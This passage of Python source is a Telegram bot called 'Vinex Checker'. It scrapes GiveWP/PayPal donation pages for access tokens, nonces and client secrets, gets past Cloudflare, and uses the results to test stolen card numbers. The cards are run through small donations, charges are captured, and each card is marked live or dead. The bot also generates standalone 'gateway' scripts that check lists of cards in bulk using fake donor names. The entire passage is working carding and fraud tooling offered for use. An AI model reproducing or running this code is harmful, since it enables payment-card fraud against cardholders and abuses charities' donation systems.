            return None, 'PP_API_%s' % r.status_code
        except Exception as e: return None, 'PP_API_EXC_%s' % type(e).__name__

    def _confirm(self, oid, n, mm, yy, cvc):
        if not ACCESS_TOKEN: return '', 'NO_TOKEN'
        try:
            he = {"authorization":"Bearer "+ACCESS_TOKEN,"paypal-client-metadata-id":PAYPAL_META or CLIENT_ID or "","content-type":"application/json","origin":"https://"+HOST,"referer":PAGE_URL}
            expiry = "20%s-%s" % (yy,mm)
            da = {"payment_source":{"card":{"number":n,"expiry":expiry,"security_code":cvc,"attributes":{"verification":{"method":"SCA_WHEN_REQUIRED"}}}},"application_context":{"vault":False}}
            cr = self.r.post("https://cors.api.paypal.com/v2/checkout/orders/"+oid+"/confirm-payment-source", headers=he, json=da, timeout=20)
            return cr.text or "", cr.status_code
        except Exception as e: return "", "EXC_%s" % type(e).__name__

    def _approve(self, oid, amt, pid):
        try:
            fd = {"give-form-id-prefix":ID_FORM1,"give-form-id":ID_FORM2,"give-form-hash":NONCE,"give-amount":amt,"give-currency":CURRENCY,"payment-mode":"paypal-commerce","give_first":random.choice(FIRST_NAMES),"give_last":random.choice(LAST_NAMES),"give_email":self.email,"give-gateway":"paypal-commerce","give_agree_to_terms":"on"}
            if pid is not None: fd["give-price-id"] = pid
            fd = self._autofill(fd)
            da = MultipartEncoder({k:(None,str(v)) for k,v in fd.items()})
            r = self.r.post(AJAX_URL, params={"action":"give_paypal_commerce_approve_order","order":oid}, headers={"content-type":da.content_type,"x-requested-with":"XMLHttpRequest","referer":PAGE_URL,"origin":"https://"+HOST}, data=da, timeout=20)
            return r.text or "", r.status_code
        except Exception as e: return "", "EXC_%s" % type(e).__name__

    def _read_final(self, oid):
        if not ACCESS_TOKEN or not oid: return None
        try:
            headers = {'Authorization': 'Bearer ' + ACCESS_TOKEN, 'Content-Type': 'application/json'}
            r = self.r.get('https://api-m.paypal.com/v2/checkout/orders/' + oid, headers=headers, timeout=15)
            if r.status_code != 200: return {'status': 'READ_FAILED', 'http': r.status_code}
            j = r.json()
            out = {'status': j.get('status'), 'intent': j.get('intent'), 'id': j.get('id'),
                   'captures': [], 'purchase_units': j.get('purchase_units') or []}
            for pu in (j.get('purchase_units') or []):
                pays = pu.get('payments') or {}
                for cap in (pays.get('captures') or []):
                    out['captures'].append(cap)
            return out
        except Exception as e:
            return {'status': 'READ_EXC', 'error': str(e)[:200]}

    def _capture(self, oid):
        if not ACCESS_TOKEN or not oid: return None
        try:
            headers = {'Authorization': 'Bearer ' + ACCESS_TOKEN, 'Content-Type': 'application/json',
                       'PayPal-Request-Id': hashlib.md5(('%s%s' % (oid, time.time())).encode()).hexdigest(),
                       'Prefer': 'return=representation'}
            r = self.r.post('https://api-m.paypal.com/v2/checkout/orders/' + oid + '/capture', headers=headers, json={}, timeout=20)
            if r.status_code in (200, 201):
                try: return r.json()
                except Exception: return {'raw': r.text[:300]}
            return {'error': r.status_code}
        except Exception as e: return {'error': type(e).__name__}

    def _format_final(self, final, cap):
        if not final: return None
        status = final.get('status')
        if status == 'COMPLETED':
            cap_id = None; amt_val = None; currency_val = None
            if cap and isinstance(cap, dict):
                pu = (cap.get('purchase_units') or [{}])[0]
                pays = pu.get('payments') or {}
                caps = pays.get('captures') or []
                if caps:
                    cap_id = caps[0].get('id')
                    amt_val = (caps[0].get('amount') or {}).get('value')
                    currency_val = (caps[0].get('amount') or {}).get('currency_code')
            if not cap_id:
                for c in (final.get('captures') or []):
                    if c.get('status') == 'COMPLETED':
                        cap_id = c.get('id')
                        amt_val = (c.get('amount') or {}).get('value')
                        currency_val = (c.get('amount') or {}).get('currency_code')
                        break
            self.last_capture_id = cap_id
            return 'CHARGE %s %s [CAPTURED: %s]' % (amt_val or self.donation, currency_val or CURRENCY, cap_id or 'N/A')
        if status == 'APPROVED':
            return 'APPROVED order %s (not captured)' % final.get('id')
        if status == 'PAYER_ACTION_REQUIRED':
            return 'PAYER_ACTION_REQUIRED order %s' % final.get('id')
        if status == 'VOIDED':
            return 'VOIDED order %s' % final.get('id')
        return None

    def Charge(self, ccx):
        try:
            parts = re.split(r"[|:/]", ccx.strip().replace(" ",""))
            if len(parts) < 4: return "INVALID_CARD_FORMAT"
            n = re.sub(r"\D","",parts[0]); mm = re.sub(r"\D","",parts[1]).zfill(2)
            yy = re.sub(r"\D","",parts[2]); cvc = re.sub(r"\D","",parts[3])
            if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
            yy = yy.zfill(2)
            if not luhn_check(n): return "INVALID_CARD_NUMBER"

            pairs = []
            if PRICE_LEVELS:
                for pid, amt in sorted(PRICE_LEVELS, key=lambda x: x[1]):
                    pairs.append((pid, "%0.2f" % amt))
            base_amts = set(a for _, a in pairs)
            for amt in BASE_AMOUNTS:
                if amt not in base_amts:
                    pairs.append(("custom", amt))
            pairs = sorted(pairs, key=lambda x: float(x[1]))

            errors = []
            results = []
            for pid, amt in pairs:
                self.donation = amt
                oid = None
                err = None
                tier = None
                oid, err = self._create_givewp(amt, pid)
                if oid: tier = 'A'
                else:
                    oid, err = self._create_pp_api(amt)
                    if oid: tier = 'E'
                if not oid:
                    if err: errors.append((amt, err))
                    continue
                self.last_order_id = oid
                self.tier_used = tier
                conf_text, conf_status = self._confirm(oid, n, mm, yy, cvc)
                app_text, app_status = self._approve(oid, amt, pid)
                final = self._read_final(oid)
                cap = None
                if final and final.get('status') == 'APPROVED' and final.get('intent') == 'CAPTURE':
                    cap = self._capture(oid)
                    final2 = self._read_final(oid)
                    if final2 and final2.get('status') == 'COMPLETED':
                        final = final2
                self.last_order_status = (final or {}).get('status')
                fs = self._format_final(final, cap)
                if fs:
                    results.append(fs)
                    if 'CHARGE' in fs: return fs
                    continue
                combined = (conf_text or '') + '\n' + (app_text or '')
                if combined.strip():
                    raw = extract_response_text(combined)
                    if raw and is_card_decline(raw):
                        results.append(raw)
                        continue
                    if raw: results.append(raw)
            if results:
                return results[0]
            if errors:
                return errors[-1][1] or "ORDER_CREATE_FAILED"
            return "ORDER_CREATE_FAILED"
        except Exception as e: return "FATAL_%s" % type(e).__name__

def single_check():
    print("\n--- Single ---")
    try:
        c = input("Card (num|mm|yy|cvc): ").strip()
        if not c: return
        p = PayPal(); print("->", p.Charge(c))
    except Exception as e: print("Err:", e)

def file_check():
    print("\n--- File ---")
    try:
        path = input("File: ").strip()
        if not os.path.exists(path): print("Not found"); return
        with open(path) as f: cards = [l.strip() for l in f if l.strip()]
        out = "vinex_%d.txt" % int(time.time())
        with open(out, "w") as fo:
            for i, c in enumerate(cards, 1):
                try:
                    p = PayPal(); r = p.Charge(c); line = "%s => %s" % (c, r)
                    print("[%d/%d] %s" % (i, len(cards), line))
                    fo.write(line+"\n"); fo.flush()
                except Exception: pass
        print("Saved:", out)
    except Exception as e: print("Err:", e)

def main():
    print("VINEX Gateway v23.0")
    print(PAGE_URL)
    print("Prices:", PRICE_LEVELS)
    while True:
        try:
            c = input("\n[1] Single [2] File [0] Exit: ").strip()
            if c == "1": single_check()
            elif c == "2": file_check()
            elif c == "0": break
        except (KeyboardInterrupt, EOFError): break
        except Exception: continue

if __name__ == "__main__":
    try: main()
    except Exception: pass
'''

_GATEWAY_TEMPLATE = Template(GATEWAY_TEMPLATE_STR)

def generate_gateway_code(result, link, tester=None):
    link = link or 'https://invalid.local/'
    def g(a, d=''):
        try:
            if tester and getattr(tester, a, None): return getattr(tester, a)
            return d
        except Exception: return d
    p = urlparse(link); host = p.netloc or 'invalid.local'
    pl = tester.price_levels if tester and tester.price_levels else []
    ff = tester.form_fields if tester and tester.form_fields else {}
    return _GATEWAY_TEMPLATE.safe_substitute(
        page_url=link,
        ajax_url=g('ajax_url') or f'https://{host}/wp-admin/admin-ajax.php',
        id_form1=g('id_form1'), id_form2=g('id_form2'), nonce=g('nonce'),
        access_token=g('au'), paypal_meta=g('paypal'), client_id=g('client_id'),
        client_secret=g('client_secret'),
        currency=g('currency', 'USD'), minimum=g('minimum', '5.00'),
        current_pid=g('current_price_id'),
        price_levels_json=repr(pl), form_fields_json=repr(ff),
    )

# ═══════════════════════════════════════════════════════════════
#  BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def cmd_start(message):
    try:
        save_user(message.from_user.id)
        react_to(message, '🔥')
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        name = message.from_user.first_name or 'User'
        text = (
            f'[⚡] {SB("Welcome to Vinex v23.0")} {ve("party")}\n'
            f'{vsep()}\n'
            f'{vt("User", f"{name} [VIP]")}\n'
            f'{vt("ID", f"<code>{uid}</code>")}\n'
            f'{vt("Status", B("Online"))} {ve("party")}\n'
            f'{vsep()}\n'
            f'{vt("Single", "<code>/paypal URL</code>")}\n'
            f'{vt("Bulk", "<code>/mass</code>")}\n'
            f'{vt("Resume", "<code>/resume</code>")}\n'
            f'{vt("Stop", "<code>/stop</code>")}\n'
            f'{vt("Stats", "<code>/stats</code>")}\n'
            f'{vt("Diag", "<code>/diag URL</code>")}\n'
            f'{vt("Luck", "<code>/luck</code>")}\n'
            f'{vsep()}\n'
            f'{vt("Amounts", "1$ → 3$ → 5$")}\n'
            f'{vt("Tiers", "A/B/E/G")}\n'
            f'{vt("Cloudflare", "Auto-detect + solve")}\n'
            f'{vt("Final-State", "PayPal API")}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(vinex_btn('Stats', 'success', 'record', callback_data='stats'),
               vinex_btn('Help', 'success', 'gear', callback_data='help'))
        kb.add(vinex_btn('Quick Scan', 'primary', 'play', callback_data='howto_paypal'),
               vinex_btn('Bulk Scan', 'primary', 'gift', callback_data='howto_mass'))
        kb.add(vinex_btn('Try Luck', 'primary', 'party', callback_data='luck'),
               vinex_btn('Stop', 'danger', 'stop', callback_data='stop'))
        kb.add(vinex_btn('Emoji Pack', 'primary', 'laugh', callback_data='emojis'))
        safe_send_message(message.chat.id, text, reply_markup=kb, effect=EFFECT_CELEBRATE)
    except Exception: log.exception('cmd_start')

@bot.message_handler(commands=['help'])
def cmd_help(message):
    try:
        react_to(message, '💡')
        text = (
            f'[⚡] {SB("Vinex Manual v23.0")} {ve("gear")}\n'
            f'{vsep()}\n'
            f'{vt("Single", "<code>/paypal URL</code>")}\n'
            f'  {SB("→")} Decode Engine v2 (base64/32/16/85/url/html/rot/jwt/gzip/zlib/br/xor)\n'
            f'  {SB("→")} Extractor v2 (33 passes)\n'
            f'  {SB("→")} Tiers: A/B/E/G\n'
            f'  {SB("→")} Final-State read from PayPal API\n'
            f'  {SB("→")} Amounts: 1$ → 3$ → 5$\n'
            f'{vt("Bulk", "<code>/mass</code> + .txt")}\n'
            f'{vt("Control", "<code>/stop</code> / <code>/resume</code>")}\n'
            f'{vt("Diag", "<code>/diag URL</code>")}\n'
            f'{vt("Fun", "<code>/luck</code> / <code>/mood</code>")}\n'
            f'{vsep()}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', 'play', callback_data='back_start'))
        safe_send_message(message.chat.id, text, reply_markup=kb, effect=EFFECT_CELEBRATE)
    except Exception: pass

@bot.message_handler(commands=['ping'])
def cmd_ping(message):
    try:
        t0 = time.time()
        sent = safe_send_message(message.chat.id, '🏓 Pinging...')
        dt = (time.time() - t0) * 1000
        if sent:
            safe_edit_message(message.chat.id, sent.message_id,
                f'[⚡] {SB("PONG")}\n{vsep()}\n'
                f'{vt("Latency", f"<code>{dt:.0f} ms</code>")}\n'
                f'{vt("Bot", "VINEX v23.0")}\n'
                f'{vt("Users", f"<code>{len(open(USERS_FILE).read().splitlines())}</code>")}\n'
                f'{vt("Turnstile", "✅ Enabled" if _turnstile.enabled else "⚠️ Disabled")}')
    except Exception: pass

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    try:
        react_to(message, '📊')
        s = load_stats()
        users_n = len(open(USERS_FILE).read().splitlines())
        rate = (s.get('live', 0) / s.get('checks', 1) * 100 if s.get('checks', 0) else 0)
        filled = int(rate / 5)
        bar = '█' * filled + '░' * (20 - filled)
        text = (
            f'[⚡] {SB("Global Stats")} {ve("record")}\n'
            f'{vsep()}\n'
            f'{vt("Users", f"<code>{users_n}</code>")}\n'
            f'{vt("Checks", f"<code>{s.get(chr(99)+chr(104)+chr(101)+chr(99)+chr(107)+chr(115),0)}</code>")}\n'
            f'{vt("Live", f"<code>{s.get(chr(108)+chr(105)+chr(118)+chr(101),0)}</code>")} {ve("party")}\n'
            f'{vt("Dead", f"<code>{s.get(chr(100)+chr(101)+chr(97)+chr(100),0)}</code>")} {ve("ban")}\n'
            f'{vt("Rate", f"<code>{rate:.1f}%</code>")}\n'
            f'{vsep()}\n'
            f'<code>{bar}</code> {B(str(round(rate)) + "%")}'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(vinex_btn('Menu', 'primary', 'play', callback_data='back_start'),
               vinex_btn('Luck', 'success', 'party', callback_data='luck'))
        safe_send_message(message.chat.id, text, reply_markup=kb)
    except Exception: pass

@bot.message_handler(commands=['luck'])
def cmd_luck(message):
    try:
        react_to(message, '🎲')
        d = send_dice(message.chat.id, '🎲')
        if d:
            time.sleep(3)
            val = d.dice.value if hasattr(d, 'dice') else 0
            if val >= 5:
                safe_send_message(message.chat.id, f'🎉 Lucky! <code>{val}</code>\n🔥 Try /paypal!', effect=EFFECT_FIRE)
            else:
                safe_send_message(message.chat.id, f'🎲 Rolled <code>{val}</code>\n😏 Next time!')
    except Exception: pass

@bot.message_handler(commands=['mood'])
def cmd_mood(message):
    try:
        emoji = random.choice(['🎲', '🎯', '⚽', '🏀', '🎳', '🎰'])
        react_to(message, '🎉')
        send_dice(message.chat.id, emoji)
    except Exception: pass

@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def cmd_paypal(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_paypal[uid] < PAYPAL_COOLDOWN: return
        user_last_paypal[uid] = now
        chat_id = message.chat.id
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_send_message(chat_id, f'[⚡] {B("Usage")}: <code>/paypal URL</code>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(chat_id, f'[⚡] {B("Invalid link")}.')
            return
        lkey = f'{uid}:{normalize_url_key(link)}'
        if lkey in link_cooldowns:
            if now - link_cooldowns[lkey] < LINK_COOLDOWN:
                rem = int(LINK_COOLDOWN - (now - link_cooldowns[lkey]))
                safe_send_message(chat_id, f'[⚡] {B("Cooling")}: {rem}s')
                return
        link_cooldowns[lkey] = now

        react_to(message, '⚡')
        show_typing(chat_id, 'typing', duration=3.0)
        ko = safe_send_message(chat_id,
            f'[⚡] {SB("Vinex Scanning")}\n'
            f'{vsep()}\n'
            f'{vt("Target", f"<code>{link[:80]}</code>")}\n'
            f'{vt("Engine", "v23.0 + Multi-Tier")}\n'
            f'{vt("Amounts", "1$ → 3$ → 5$")}\n'
            f'{vsep()}\n'
            f'[⚡] {ve("gear")} {SB("Running Pipeline")}...')
        if not ko: return

        bump_stat('checks')
        tester = VinexTester(link)
        tester.Key()
        result = tester.Charge(TEST_CARD, thorough=True)
        live = is_live_response(result) and not is_dead_response(result)
        user_name = message.from_user.first_name or 'User'

        cf_badge = ''
        if tester.cf_detected:
            cf_badge = f'\n{vt("Cloudflare", "✅ Solved" if tester.cf_solved else "⚠️ Detected")}'

        if not live:
            bump_stat('dead')
            react_to(message, '😢')
            resp_text = normalize_result(result)[:300]
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("Dead Detected")} {ve("ban")}\n'
                f'{vsep()}\n'
                f'{vt("User", f"{user_name} [VIP]")}\n'
                f'{vt("Status", B("Dead"))} {ve("ban")}\n'
                f'{vt("Response", f"<code>{resp_text}</code>")}\n'
                f'{vt("Tier", f"<code>{tester.tier_used or chr(45)}</code>")}\n'
                f'{vt("OrderStatus", f"<code>{tester.last_order_status or chr(45)}</code>")}\n'
                f'{vt("Auth", f"<code>{tester.auth_method}</code>")}\n'
                f'{vt("Gateway", f"#{tester.gateway_type}")}\n'
                f'{vt("Tokens", f"<code>{len(tester.token_candidates)}</code>")}\n'
                f'{vt("Prices", f"<code>{len(tester.price_levels)} levels</code>")}'
                f'{cf_badge}\n'
                f'{vsep()}\n'
                f'[⚡] {SB("Vinex")} - {B("Checker")}')
            return

        bump_stat('live')
        react_to(message, '🔥')
        show_typing(chat_id, 'upload_document', duration=2.0)

        try:
            code = generate_gateway_code(result, link, tester)
            if not code or len(code) < 500:
                raise Exception(f'Too small: {len(code)}b')
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("Error")}: <code>{str(e)[:200]}</code>')
            return

        fname = f'vinex_v23_{int(time.time())}_{uid}.py'
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(code)
        except Exception as e:
            safe_edit_message(chat_id, ko.message_id,
                f'[⚡] {SB("File Error")}: <code>{str(e)[:200]}</code>')
            return

        display = normalize_result(result)[:200]
        is_charge = 'CHARGE' in str(result).upper()
        status = 'Charged' if is_charge else 'Approved'
        head = (f'[⚡] {SB("Charged")} {ve("party")} {ve("cash")}'
                if is_charge else f'[⚡] {SB("Hit Detected")} {ve("party")}')
        prices_count = len(tester.price_levels)
        cur_pid = tester.current_price_id or '—'
        cap_id = tester.last_capture_id or '—'
        oid = tester.last_order_id or '—'
        ostr = tester.last_order_status or '—'

        caption = (
            f'{head}\n'
            f'{vsep()}\n'
            f'{vt("User", f"{user_name} [VIP]")}\n'
            f'{vt("Status", B(status))} {ve("party")}\n'
            f'{vt("Response", f"<code>{display}</code>")}\n'
            f'{vt("Amount", f"<code>${tester.donation} {tester.currency}</code>")}\n'
            f'{vt("Tier", f"<code>{tester.tier_used or chr(45)}</code>")}\n'
            f'{vt("OrderID", f"<code>{oid[:32]}</code>")}\n'
            f'{vt("OrderStatus", f"<code>{ostr}</code>")}\n'
            f'{vt("CaptureID", f"<code>{cap_id[:32]}</code>")}\n'
            f'{vt("Gateway", f"<code>#{tester.gateway_type}</code>")}\n'
            f'{vt("Auth", f"<code>{tester.auth_method}</code>")}\n'
            f'{vt("Prices", f"<code>{prices_count} levels</code>")}\n'
            f'{vt("CurPID", f"<code>{cur_pid}</code>")}'
            f'{cf_badge}\n'
            f'{vsep()}\n'
            f'[⚡] {SB("Vinex")} - {B("Checker")}'
        )

        sent = None
        for attempt in range(3):
            try:
                with open(fname, 'rb') as f:
                    kw = {'chat_id': chat_id, 'document': f, 'timeout': 180}
                    if attempt == 0:
                        kw['caption'] = caption
                        kw['parse_mode'] = 'HTML'
                        try: kw['message_effect_id'] = EFFECT_FIRE
                        except Exception: pass
                    elif attempt == 1:
                        kw['caption'] = re.sub(r'<[^>]+>', '', caption)[:1024]
                    sent = bot.send_document(**kw)
                if sent: break
            except Exception: continue

        if sent:
            safe_edit_message(chat_id, ko.message_id, f'[⚡] {SB("Delivered")} {ve("party")}')
            try: send_dice(chat_id, '🎉')
            except Exception: pass
            try: os.remove(fname)
            except Exception: pass
        else:
            safe_send_message(chat_id, f'{caption}\n\n[⚡] {SB("File delivery failed")}')
    except Exception: log.exception('cmd_paypal')

@bot.message_handler(commands=['mass'])
def cmd_mass(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, f'[⚡] {B("Blocked")}.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_mass[uid] < MASS_COOLDOWN: return
        user_last_mass[uid] = now
        if mass_active.get(uid, False):
            safe_send_message(message.chat.id, '⚠️ Job running. /stop first.')
            return
        msg = safe_send_message(message.chat.id,
            f'[⚡] {SB("Bulk Mode")}\n{vsep()}\n'
            f'{vt("Format", "One URL per line")}\n'
            f'{vt("Max", "10 MB")}\n'
            f'{vt("Dedup", "Smart")}\n'
            f'{vt("Amounts", "1$ → 3$ → 5$")}\n'
            f'{vt("Tiers", "A/B/E/G")}\n'
            f'{vt("Final-State", "PayPal API")}\n'
            f'{vt("Cloudflare", "Auto-detect")}')
        if msg:
            bot.register_next_step_handler(msg, handle_mass_file)
    except Exception: log.exception('cmd_mass')

@bot.message_handler(commands=['resume'])
def cmd_resume(message):
    try:
        uid = message.from_user.id
        chat_id = message.chat.id
        progress = load_progress(uid)
        if not progress:
            safe_send_message(chat_id, f'[⚡] {B("No saved progress")}.')
            return
        if mass_active.get(uid, False):
            safe_send_message(chat_id, '⚠️ Job running already.')
            return
        total = progress.get('total', 0)
        processed = progress.get('processed', 0)
        if processed >= total:
            safe_send_message(chat_id, f'✅ Complete ({processed}/{total})')
            clear_progress(uid)
            return
        links = progress.get('links', [])
        if not links:
            safe_send_message(chat_id, '❌ Corrupt progress.')
            clear_progress(uid)
            return
        safe_send_message(chat_id, f'♻️ Resuming {processed}/{total}...')
        threading.Thread(target=run_mass_job,
            args=(chat_id, uid, links, processed, progress), daemon=True).start()
    except Exception: log.exception('cmd_resume')

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    try:
        uid = message.from_user.id
        if mass_active.get(uid, False):
            mass_pause[uid] = True
            safe_send_message(message.chat.id, '🛑 Stopping...')
        else:
            safe_send_message(message.chat.id, '❌ No active job.')
    except Exception: pass

def handle_mass_file(message):
    try:
        if not message.document:
            safe_send_message(message.chat.id, '❌ Send a .txt file.')
            return
        size = message.document.file_size or 0
        if size > MAX_FILE_SIZE:
            safe_send_message(message.chat.id, f'❌ File too large: {size // 1024} KB')
            return
        uid = message.from_user.id
        chat_id = message.chat.id
        try:
            fi = retry_call(bot.get_file, message.document.file_id, retries=4)
        except Exception as e:
            safe_send_message(chat_id, f'⚠️ Network: <code>{str(e)[:150]}</code>')
            return
        try:
            data = retry_call(bot.download_file, fi.file_path, retries=4)
        except Exception as e:
            safe_send_message(chat_id, f'⚠️ Download: <code>{str(e)[:150]}</code>')
            return
        if not data:
            safe_send_message(chat_id, '❌ Empty file.')
            return
        raw = data.decode('utf-8', errors='ignore').splitlines()
        links = []
        seen = set()
        dupes = 0
        for line in raw:
            s = safe_url(line.strip())
            if not s: continue
            k = normalize_url_key(s)
            if k in seen:
                dupes += 1
                continue
            seen.add(k)
            links.append(s)
        if not links:
            safe_send_message(chat_id, '❌ No valid URLs.')
            return
        total = len(links)
        progress = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'links': links, 'started_at': time.time(),
        }
        save_progress(uid, progress)
        dupe_msg = f'\n🗑️ Duplicates: <code>{dupes}</code>' if dupes else ''
        safe_send_message(chat_id,
            f'[⚡] {SB("Ready")} {ve("party")}\n{vsep()}\n'
            f'{vt("Loaded", f"<code>{total}</code> unique")}{dupe_msg}\n'
            f'{vt("Mode", "THOROUGH")}\n'
            f'{vt("Amounts", "1$ → 3$ → 5$")}\n'
            f'{vt("Tiers", "A/B/E/G")}\n'
            f'{vsep()}\n'
            f'{ve("sound")} {SB("Launching")}...')
        threading.Thread(target=run_mass_job,
            args=(chat_id, uid, links, 0, progress), daemon=True).start()
    except Exception: log.exception('handle_mass_file')

def run_mass_job(chat_id, uid, links, start_idx, progress):
    total = len(links)
    processed = start_idx
    live = progress.get('live', 0)
    dead = progress.get('dead', 0)
    started_at = progress.get('started_at', time.time())
    mass_active[uid] = True
    mass_pause[uid] = False
    results_file = RESULTS_TMPL.format(uid, int(started_at))
    live_dir = LIVE_DIR_TMPL.format(uid, int(started_at))
    try: os.makedirs(live_dir, exist_ok=True)
    except Exception: pass

    state = {
        'processed': processed,
        'live': live,
        'dead': dead,
        'last_link': '',
        'last_resp': '',
        'last_live': False,
        'status': 'starting',
        'live_idx': 0,
        'stop': False,
    }
    shared = mass_shared[uid] = {'state': state, 'lock': threading.Lock()}

    status_msg = safe_send_message(chat_id,
        f'[⚡] {SB("Mass Scan Running")}\n{vsep()}\n'
        f'{vt("Total", f"<code>{total}</code>")}\n'
        f'{vt("Mode", "THOROUGH")}\n⏳ Starting...')

    def status_loop():
        last_text = ''
        while True:
            try:
                with shared['lock']:
                    st = dict(state)
                if st['stop']:
                    break
                pct = int((st['processed'] / total) * 100) if total else 0
                elapsed = time.time() - started_at
                spd = st['processed'] / elapsed if elapsed else 0
                eta = (total - st['processed']) / spd if spd > 0 else 0
                filled = int((pct / 100) * 20)
                bar = '█' * filled + '░' * (20 - filled)
                if st['last_link']:
                    icon = '✅' if st['last_live'] else '❌'
                    last = (f"{icon} <b>Last:</b>\n"
                            f"<code>{st['last_link'][:60]}</code>\n"
                            f"💬 {st['last_resp'][:60]}")
                else:
                    last = '⏳ Waiting...'
                stat_txt = ('🔄 Checking...' if st['status'] == 'checking' else '⏸️ Moving...')
                text = (
                    f'[⚡] {SB("Mass Scan")}\n{vsep()}\n'
                    f'{vt("Total", f"<code>{total}</code>")}\n'
                    f'{vt("Processed", f"<code>{st['processed']}</code>")}\n'
                    f'{vt("Live", f"<code>{st['live']}</code>")} {ve("party")}\n'
                    f'{vt("Dead", f"<code>{st['dead']}</code>")}\n'
                    f'{vt("Progress", f"{pct}%")}\n'
                    f'<code>{bar}</code>\n'
                    f'{vsep()}\n{last}\n{vsep()}\n{stat_txt}\n'
                    f'{vt("Speed", f"<code>{spd:.2f}/s</code>")}\n'
                    f'{vt("ETA", f"{int(eta // 60)}m{int(eta % 60)}s")}')
                if text != last_text and status_msg:
                    safe_edit_message(chat_id, status_msg.message_id, text)
                    last_text = text
            except Exception:
                pass
            time.sleep(STATUS_UPDATE_EVERY)

    status_thread = threading.Thread(target=status_loop, daemon=True)
    status_thread.start()

    try:
        for idx in range(start_idx, total):
            if mass_pause.get(uid, False):
                with shared['lock']:
                    state['processed'] = processed
                    state['live'] = live
                    state['dead'] = dead
                    state['stop'] = True
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
                safe_send_message(chat_id, f'🛑 Stopped at {processed}/{total}\n♻️ /resume')
                return
            link = links[idx]
            with shared['lock']:
                state['status'] = 'checking'
            try:
                result = check_single_link(link, thorough=True)
            except Exception:
                result = {'link': str(link)[:100], 'live': False, 'respons': 'FATAL', 'tester': None}
            processed += 1
            resp = normalize_result(result.get('respons', 'Unknown'))[:100]
            is_live = result.get('live', False)
            with shared['lock']:
                state['processed'] = processed
                state['last_link'] = link
                state['last_resp'] = resp
                state['last_live'] = is_live
            try:
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(f'{link} => {result.get("respons", "unknown")}\n')
            except Exception:
                pass
            bump_stat('checks')
            if is_live:
                live += 1
                with shared['lock']:
                    state['live'] = live
                    state['live_idx'] += 1
                    lidx = state['live_idx']
                bump_stat('live')
                try:
                    tester = result.get('tester')
                    code = generate_gateway_code(result['respons'], result['link'], tester)
                    gpath = os.path.join(live_dir, f'gateway_{lidx}_{int(time.time())}.py')
                    with open(gpath, 'w', encoding='utf-8') as f:
                        f.write(code)
                    cur = tester.currency if tester else 'USD'
                    auth = tester.auth_method if tester else 'none'
                    tier = tester.tier_used if tester else None
                    oid = tester.last_order_id if tester else None
                    ostr = tester.last_order_status if tester else None
                    cap_id = tester.last_capture_id if tester else None
                    caption = (
                        f'[⚡] {SB("LIVE")} #{lidx} {ve("party")}\n'
                        f'{vsep()}\n'
                        f'{vt("URL", f"<code>{result["link"][:80]}</code>")}\n'
                        f'{vt("Response", resp[:80])}\n'
                        f'{vt("Amount", f"<code>${result.get(chr(97)+chr(109)+chr(111)+chr(117)+chr(110)+chr(116), chr(49)+chr(46)+chr(48)+chr(48))} {cur}</code>")}\n'
                        f'{vt("Tier", f"<code>{tier or chr(45)}</code>")}\n'
                        f'{vt("OrderID", f"<code>{(oid or chr(45))[:32]}</code>")}\n'
                        f'{vt("OrderStatus", f"<code>{ostr or chr(45)}</code>")}\n'
                        f'{vt("CaptureID", f"<code>{(cap_id or chr(45))[:32]}</code>")}\n'
                        f'{vt("Auth", f"<code>{auth}</code>")}\n'
                        f'{vsep()}\n'
                        f'[⚡] {SB("Vinex")} - {B("Checker")}')
                    sent = safe_send_document(chat_id, gpath, caption=caption)
                    if sent:
                        try: os.remove(gpath)
                        except Exception: pass
                except Exception:
                    log.exception('live delivery')
            else:
                dead += 1
                with shared['lock']:
                    state['dead'] = dead
                bump_stat('dead')
            if processed % PROGRESS_SAVE_EVERY == 0:
                with shared['lock']:
                    state['processed'] = processed
                    state['live'] = live
                    state['dead'] = dead
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
            with shared['lock']:
                state['status'] = 'moving'
        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        with shared['lock']:
            state['stop'] = True
        rate = int((live / total) * 100) if total else 0
        final = (
            f'[⚡] {SB("Mass Complete")} {ve("party")}\n{vsep()}\n'
            f'{vt("Total", f"<code>{total}</code>")}\n'
            f'{vt("Live", f"<code>{live}</code>")} {ve("party")}\n'
            f'{vt("Dead", f"<code>{dead}</code>")}\n'
            f'{vt("Rate", f"<code>{rate}%</code>")}\n'
            f'{vt("Results", f"<code>{results_file}</code>")}')
        if status_msg:
            safe_edit_message(chat_id, status_msg.message_id, final)
        else:
            safe_send_message(chat_id, final)
        clear_progress(uid)
    except Exception:
        log.exception('run_mass_job')
        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        with shared['lock']:
            state['processed'] = processed
            state['live'] = live
            state['dead'] = dead
            state['stop'] = True
